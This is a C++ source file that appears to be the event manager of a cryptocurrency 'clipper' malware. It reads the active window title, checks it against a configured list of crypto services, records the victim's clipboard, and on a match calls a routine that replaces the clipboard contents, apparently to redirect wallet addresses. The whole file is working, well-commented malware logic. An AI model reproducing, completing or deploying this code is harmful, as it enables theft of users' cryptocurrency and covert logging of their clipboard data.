#include "ClipperEventManager.h"
#include "ClipLogger.h"
#include "Config.h"
#include "Clipper.h"

#include <iostream>
#include <Windows.h>

// Function that returns the title of the currently active window.
std::string ClipperEventManager::GetActiveWindows()
{
    char title[1024];  // Array to store the window title.

    // Get the handle to the foreground (currently active) window.
    HWND handle = GetForegroundWindow();

    // If no active window is found (handle is null), return an empty string.
    if (handle == nullptr) {
        return "";
    }

    // Get the title of the window using its handle, storing it in the 'title' array.
    GetWindowTextA(handle, title, sizeof(title));

    // Return the window title as a std::string.
    return std::string(title);
}

// A helper function to perform case-insensitive comparison between two characters.
bool caseInsensitiveCompare(char c1, char c2) {
    // Convert both characters to lowercase and compare them.
    return std::tolower(c1) == std::tolower(c2);
}

// Function that checks if a target string exists within a given string, case-insensitively.
bool ClipperEventManager::find_to_str(const std::string& str, const std::string& target) {

    // Use std::search to find the target string within the source string 'str' 
    // with case-insensitive comparison function 'caseInsensitiveCompare'.
    auto it = std::search(str.begin(), str.end(), target.begin(), target.end(), caseInsensitiveCompare);

    // If the target string is found, return true.
    if (it != str.end()) {
        return true;
    }

    // If the target string is not found, return false.
    return false;
}

// Function to detect if the currently active window matches any of the configured target strings.
bool ClipperEventManager::Detect()
{
    // Iterate over each text in the list of crypto services (defined elsewhere in the config).
    for (auto& text : Config::CryptoServices)
    {
        // Call 'find_to_str' to check if the active window title matches any of the crypto service names.
        // If a match is found, return true indicating a detection.
        if (ClipperEventManager::find_to_str(GetActiveWindows(), text))
        {
            return true;
        }
    }

    // If no match is found, return false indicating no detection.
    return false;
}

// Function that performs an action based on the detection of an active window.
bool ClipperEventManager::Action()
{
    // Save the current clipboard content using ClipLogger.
    ClipLogger::SaveClipboard();

    // Call 'Detect' to check if an active window matches any target (crypto services).
    if (ClipperEventManager::Detect())
    {
        // If the window was detected, attempt to replace the clipboard content via Clipper.
        // If the replacement is successful, return true indicating the action was completed.
        if (Clipper::Replace())
        {
            return true;
        }
    }

    // If no detection or replacement occurs, return false.
    return false;
}
